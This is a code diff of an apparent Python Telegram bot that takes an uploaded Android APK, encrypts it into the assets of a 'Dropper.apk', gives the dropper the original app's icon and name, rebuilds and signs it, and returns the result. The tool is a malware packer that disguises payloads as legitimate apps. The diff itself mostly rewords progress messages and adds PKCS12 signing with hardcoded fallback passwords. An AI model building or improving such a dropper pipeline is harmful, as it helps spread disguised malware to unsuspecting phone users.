@@ -143,36 +143,36 @@ def process_encryption(apk_data: bytes, assets_dir: str):
             f.write(bytes(chunk))
     return meta
 
-# ----- ডিবাগ ভার্সন: প্রতিটি ধাপে মেসেজ পাঠায় -----
+# ----- APK প্রসেসিং (PKCS12 সাপোর্ট সহ) -----
 async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, apk_data: bytes):
     user_id = update.effective_user.id
     chat_id = update.effective_chat.id
 
     try:
-        await context.bot.send_message(chat_id, "📥 Step 1: APK received. Starting processing...")
+        await context.bot.send_message(chat_id, "📥 APK received. Processing started.")
     except Exception as e:
-        logger.error(f"Failed to send message: {e}")
+        logger.error(f"Failed to send initial message: {e}")
 
     work_dir = tempfile.mkdtemp()
     try:
         input_apk = os.path.join(work_dir, 'input.apk')
         with open(input_apk, 'wb') as f:
             f.write(apk_data)
-        await context.bot.send_message(chat_id, "✅ Step 2: APK saved to temp folder.")
+        await context.bot.send_message(chat_id, "✅ APK saved.")
 
-        # ----- Step 3: Decode -----
-        await context.bot.send_message(chat_id, "📦 Step 3: Decoding APK with apktool...")
+        # ----- Decode APK -----
+        await context.bot.send_message(chat_id, "📦 Decoding APK...")
         decoded_dir = os.path.join(work_dir, 'decoded')
         cmd = f"apktool d -f -o {decoded_dir} {input_apk}"
         logger.info(f"Running: {cmd}")
         result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
         if result.returncode != 0:
-            await context.bot.send_message(chat_id, f"❌ apktool decode failed:\n{result.stderr}")
+            await context.bot.send_message(chat_id, f"❌ Decode failed:\n{result.stderr[:500]}")
             return
-        await context.bot.send_message(chat_id, "✅ Step 4: APK decoded successfully.")
+        await context.bot.send_message(chat_id, "✅ Decoded successfully.")
 
-        # ----- Step 4: Change package name -----
-        await context.bot.send_message(chat_id, "🔧 Step 5: Changing package name...")
+        # ----- Change package name -----
+        await context.bot.send_message(chat_id, "🔧 Changing package name...")
         manifest_path = os.path.join(decoded_dir, 'AndroidManifest.xml')
         if not os.path.exists(manifest_path):
             await context.bot.send_message(chat_id, "❌ AndroidManifest.xml not found!")
@@ -182,16 +182,16 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
         manifest = manifest.replace('package="', f'package="{TARGET_PACKAGE}"')
         with open(manifest_path, 'w') as f:
             f.write(manifest)
-        await context.bot.send_message(chat_id, f"✅ Step 6: Package name changed to {TARGET_PACKAGE}")
+        await context.bot.send_message(chat_id, f"✅ Package name changed to {TARGET_PACKAGE}")
 
-        # ----- Step 5: Encrypt -----
-        await context.bot.send_message(chat_id, "🔐 Step 7: Encrypting APK...")
+        # ----- Encrypt -----
+        await context.bot.send_message(chat_id, "🔐 Encrypting APK...")
         assets_dir = os.path.join(decoded_dir, 'assets')
         process_encryption(apk_data, assets_dir)
-        await context.bot.send_message(chat_id, "✅ Step 8: Encryption completed.")
+        await context.bot.send_message(chat_id, "✅ Encryption completed.")
 
-        # ----- Step 6: Decode Dropper -----
-        await context.bot.send_message(chat_id, "📦 Step 9: Decoding Dropper.apk...")
+        # ----- Decode Dropper.apk -----
+        await context.bot.send_message(chat_id, "📦 Decoding Dropper.apk...")
         dropper_apk = os.path.join(os.getcwd(), 'Dropper.apk')
         if not os.path.exists(dropper_apk):
             await context.bot.send_message(chat_id, "⚠️ Dropper.apk not found! Creating dummy...")
@@ -202,18 +202,17 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
         logger.info(f"Running: {cmd}")
         result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
         if result.returncode != 0:
-            await context.bot.send_message(chat_id, f"❌ Dropper decode failed:\n{result.stderr}")
+            await context.bot.send_message(chat_id, f"❌ Dropper decode failed:\n{result.stderr[:500]}")
             return
-        await context.bot.send_message(chat_id, "✅ Step 10: Dropper decoded.")
+        await context.bot.send_message(chat_id, "✅ Dropper decoded.")
 
-        # ----- Step 7: Copy icon and name -----
-        await context.bot.send_message(chat_id, "🎨 Step 11: Copying icon and app name...")
+        # ----- Copy icon and app name -----
+        await context.bot.send_message(chat_id, "🎨 Copying icon and app name...")
         res_src = os.path.join(decoded_dir, 'res')
         res_dst = os.path.join(dropper_decoded, 'res')
         if os.path.exists(res_src):
             shutil.copytree(res_src, res_dst, dirs_exist_ok=True)
 
-        # app_name
         strings_src = os.path.join(decoded_dir, 'res/values/strings.xml')
         if os.path.exists(strings_src):
             import xml.etree.ElementTree as ET
@@ -234,46 +233,55 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
                             string.text = app_name
                             break
                     dtree.write(strings_dst)
-        await context.bot.send_message(chat_id, "✅ Step 12: Icon and name copied.")
+        await context.bot.send_message(chat_id, "✅ Icon and name copied.")
 
-        # ----- Step 8: Rebuild -----
-        await context.bot.send_message(chat_id, "✍️ Step 13: Rebuilding APK...")
+        # ----- Rebuild -----
+        await context.bot.send_message(chat_id, "✍️ Rebuilding APK...")
         output_apk = os.path.join(work_dir, 'output.apk')
         cmd = f"apktool b -o {output_apk} {dropper_decoded}"
         logger.info(f"Running: {cmd}")
         result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
         if result.returncode != 0:
-            await context.bot.send_message(chat_id, f"❌ Rebuild failed:\n{result.stderr}")
+            await context.bot.send_message(chat_id, f"❌ Rebuild failed:\n{result.stderr[:500]}")
             return
-        await context.bot.send_message(chat_id, "✅ Step 14: APK rebuilt.")
+        await context.bot.send_message(chat_id, "✅ APK rebuilt.")
 
-        # ----- Step 9: Sign -----
-        await context.bot.send_message(chat_id, "✍️ Step 15: Signing APK...")
-        keystore = os.path.join(os.getcwd(), 'signer/myKey.p12')
+        # ----- Sign using PKCS12 (.p12) -----
+        await context.bot.send_message(chat_id, "✍️ Signing APK...")
+        keystore = os.path.join(os.getcwd(), 'signer', 'myKey.p12')
         if not os.path.exists(keystore):
             await context.bot.send_message(chat_id, "❌ Keystore not found! Please upload signer/myKey.p12")
             return
-        passwd = os.environ.get('KEYSTORE_PASS', '12345600')
-        cmd = f"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore {keystore} -storepass {passwd} -keypass {passwd} {output_apk} mykey"
+
+        # Read password from file or env
+        pass_file = os.path.join(os.getcwd(), 'signer', 'keystore_pass.txt')
+        if os.path.exists(pass_file):
+            with open(pass_file, 'r') as f:
+                passwd = f.read().strip()
+        else:
+            passwd = os.environ.get('KEYSTORE_PASS', '123456')
+
+        # jarsigner with PKCS12
+        cmd = f"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore {keystore} -storetype PKCS12 -storepass {passwd} -keypass {passwd} {output_apk} mykey"
         logger.info(f"Running: {cmd}")
         result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
         if result.returncode != 0:
-            await context.bot.send_message(chat_id, f"❌ Signing failed:\n{result.stderr}")
+            await context.bot.send_message(chat_id, f"❌ Signing failed:\n{result.stderr[:500]}")
             return
-        await context.bot.send_message(chat_id, "✅ Step 16: APK signed.")
+        await context.bot.send_message(chat_id, "✅ APK signed.")
 
-        # ----- Step 10: Send -----
-        await context.bot.send_message(chat_id, "📤 Step 17: Sending final APK...")
+        # ----- Send final APK -----
+        await context.bot.send_message(chat_id, "📤 Sending final APK...")
         with open(output_apk, 'rb') as f:
             await context.bot.send_document(chat_id, f, filename=f"app_{user_id}.apk")
-        await context.bot.send_message(chat_id, "✅ Step 18: Done! APK sent.")
+        await context.bot.send_message(chat_id, "✅ Done! APK sent.")
 
         shutil.rmtree(work_dir)
         logger.info(f"APK processing complete for user {user_id}")
 
     except Exception as e:
         logger.error(f"Error: {e}")
-        await context.bot.send_message(chat_id, f"❌ Error: {str(e)}")
+        await context.bot.send_message(chat_id, f"❌ Error: {str(e)[:500]}")
         shutil.rmtree(work_dir, ignore_errors=True)
 
 # ----- বট কমান্ড -----
@@ -341,7 +349,6 @@ async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         apk_data = await file.download_as_bytearray()
         await update.message.reply_text(f"📦 File size: {len(apk_data)} bytes")
 
-        # ব্যাকগ্রাউন্ডে টাস্ক
         context.application.create_task(process_apk_file(update, context, apk_data))
     except Exception as e:
         await update.message.reply_text(f"❌ Failed to download: {str(e)}")
